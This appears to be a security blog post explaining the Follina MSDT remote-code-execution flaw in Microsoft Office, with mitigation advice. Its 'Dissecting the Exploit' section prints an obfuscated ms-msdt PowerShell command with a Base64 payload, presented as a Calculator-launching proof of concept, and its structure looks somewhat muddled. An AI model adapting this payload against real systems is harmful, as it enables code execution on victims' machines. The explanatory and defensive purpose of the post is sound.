---
title: 'Unmasking Follina: The Zero-Day Threat That Shook Microsoft Office'
date: '2024-03-08'
excerpt: 'A deep dive into CVE-2022-30190, its inner workings, and how to shield your systems from this insidious threat.'
---

# Unmasking Follina: The Zero-Day Threat That Shook Microsoft Office

![Follina Vulnerability Diagram](https://www.stormshield.com/wp-content/uploads/image-pasted-at-2022-6-1-17-14.png)

In the ever-evolving landscape of cybersecurity, certain vulnerabilities emerge that send shockwaves through the industry. CVE-2022-30190, better known as "Follina," was one such seismic event. This zero-day vulnerability in Microsoft Office set off alarm bells across the global cybersecurity community, and for good reason. Today, we're going to dissect this digital beast, understand its anatomy, and fortify our defenses against it.

## The Anatomy of Follina

At its core, Follina is a remote code execution (RCE) vulnerability that exploits the Microsoft Support Diagnostic Tool (MSDT). The attack vector is deviously simple yet devastatingly effective:

1. A malicious actor crafts a specially formatted Office document.
2. This document contains a URL pointing to an HTML file.
3. When opened, the document uses the MS-MSDT protocol handler to load and execute PowerShell code.
4. This PowerShell payload can then execute arbitrary commands with the privileges of the calling application.

The truly insidious part? This attack bypasses Protected View, a security feature designed to prevent exactly this type of exploit. It's like a digital lockpick that renders your strongest door useless.

## The Perfect Storm

What made Follina particularly dangerous was its perfect storm of attributes:

- **Wide Attack Surface**: It affected all supported Windows versions and Office versions.
- **Low Complexity**: Exploiting the vulnerability required minimal technical skill.
- **No User Interaction**: In some cases, merely previewing the malicious file was enough to trigger the exploit.
- **High Impact**: Successful exploitation granted the attacker the same privileges as the compromised user.

## Dissecting the Exploit

Let's break down the exploit step by step:

```powershell
ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABjAD0AJwAtAGYAIABDADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAZgBvAG8ALgB0AHgAdAAnADsAJABhAD0AJwAtAGUAbgBjAG8AZABlAGQAYwBvAG0AbQBhAG4AZAAnADsAJABlAD0AJwBKAEEAQgB5AEEARwBNAEEAWgBRAEIAdQBBAEcAWQBBAGUAUQBCAHUAQQBHAFUAQQAnADsAJABkAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQApACkAOwAkAGYAPQAnAGMAYQBsAGMALgBlAHgAZQAnADsAJABiAD0ASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkACAALQBPAHUAdABTAHQAcgBpAG4AZwA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGYAIAAkAGEAIAAkAGIA")))))')"
```

This obfuscated PowerShell command is the heart of the Follina exploit. It leverages the MS-MSDT protocol to execute a Base64 encoded payload, which in turn launches a Calculator app as a proof of concept. In a real-world scenario, this could be replaced with any malicious payload.

## Shielding Against Follina
Protecting against Follina requires a multi-layered approach:

    1. Patch Management: Apply Microsoft's security updates immediately.
    2. Disable MSDT: Use the Registry Editor to disable the ms-msdt protocol.
    3. Network Segmentation: Implement strict network controls to limit potential spread.
    4. EDR Solutions: Deploy Endpoint Detection and Response tools to catch unusual activity.
    5. User Training: Educate users about the dangers of opening unexpected documents.

## The Bigger Picture
Follina serves as a stark reminder of the constant cat-and-mouse game between attackers and defenders. It showcases the importance of:

 - Rapid vulnerability disclosure and patching
 - Defense-in-depth strategies
 - Continuous security awareness training

As we move forward, it's crucial to remain vigilant. The next Follina is always just around the corner, waiting to test our defenses.

## Conclusion
CVE-2022-30190 may be patched, but its lessons remain evergreen. By understanding its mechanics and implementing robust defenses, we can better prepare for the next zero-day that inevitably lurks on the horizon. Stay sharp, stay updated, and never underestimate the creativity of those who seek to breach our digital fortresses.

*Remember, in the world of cybersecurity, paranoia isn't just healthy â€“ it's a survival trait.*


